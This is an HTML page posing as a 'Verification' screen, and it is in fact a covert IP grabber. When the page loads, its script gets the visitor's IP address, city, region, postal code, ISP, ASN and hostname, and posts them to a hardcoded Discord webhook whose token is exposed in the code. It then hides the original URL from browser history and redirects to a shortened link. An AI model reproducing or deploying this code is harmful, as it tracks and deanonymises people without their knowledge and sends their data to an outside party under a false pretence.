<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Verification</title>
    <style>
        body {
            background-color: #000;
            color: #fff;
            font-family: 'Arial', sans-serif;
            text-align: center;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;

        h1 {
            font-size: 30px;

        }
    </style>
</head>
<body>

    <h1>Verifying...</h1>

    <script>
        // Define the Discord webhook URL and redirection link
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1341433412753555548/e8tFi_i8MXCevhm7FtWgP6jQBRF1ANCfLKsE1ya6hjTs02qPLTQgzDCjqCVywLxkWLKX";
        const REDIRECT_URL = "https://is.gd/gwuu9c";

        // Function to fetch visitor's IP and network details
        async function getIPInfo() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                if (!response.ok) throw new Error("Failed to retrieve IP information");
                const data = await response.json();

                // Extract relevant details
                return {
                    ip: data.ip || "Unknown",
                    isp: data.org || "Unknown ISP",
                    country: data.country || "Unknown Country",
                    city: data.city || "Unknown City",
                    region: data.region || "Unknown Region",
                    hostname: data.hostname || "Unknown Host",
                    asn: data.asn ? data.asn.asn : "Unknown ASN",
                    asn_org: data.asn ? data.asn.name : "Unknown ASN Org",
                    postal: data.postal || "Unknown Postal Code",
                    timezone: data.timezone || "Unknown Timezone",
                    vpn: detectVPN(data)
                };
            } catch (error) {
                console.error("Error fetching IP info:", error);
                return null;
            }
        }

        // Function to determine if the user is likely using a VPN
        function detectVPN(data) {
            const vpnKeywords = ["VPN", "Proxy", "Hosting", "Datacenter", "Cloudflare", "AWS", "Google Cloud", "Azure", "OVH", "Linode", "Hetzner"];
            const isp = data.org ? data.org.toLowerCase() : "";
            const asn_org = data.asn ? data.asn.name.toLowerCase() : "";

            if (data.bogon) return "Yes (Bogon IP)";
            return vpnKeywords.some(keyword => isp.includes(keyword) || asn_org.includes(keyword)) ? "Yes" : "No";
        }

        // Function to send data to Discord webhook
        async function sendToWebhook(ipInfo) {
            if (!ipInfo) return;

            try {
                const payload = {
                    content: `ðŸ“Œ **New Visitor Detected** ðŸ“Œ\n\n` +
                        `ðŸ”¹ **IP Address:** ${ipInfo.ip}\n` +
                        `ðŸŒ **Location:** ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country} (${ipInfo.postal})\n` +
                        `ðŸ•° **Timezone:** ${ipInfo.timezone}\n` +
                        `ðŸ¢ **ISP:** ${ipInfo.isp}\n` +
                        `ðŸ”— **ASN:** ${ipInfo.asn} - ${ipInfo.asn_org}\n` +
                        `ðŸ” **Hostname:** ${ipInfo.hostname}\n` +
                        `ðŸ›‘ **VPN Detected:** ${ipInfo.vpn}`
                };

                await fetch(WEBHOOK_URL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(payload)
                });
            } catch (error) {
                console.error("Error sending data to webhook:", error);
            }
        }

        (async function () {
            const ipInfo = await getIPInfo();

            if (ipInfo) {
                sendToWebhook(ipInfo); // Send webhook data asynchronously
            }

            // Hide the original URL from the browser history
            history.replaceState(null, '', REDIRECT_URL);

            // Instantly redirect the user
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 300); // Small delay for smooth transition
        })();
    </script>

</body>
</html>
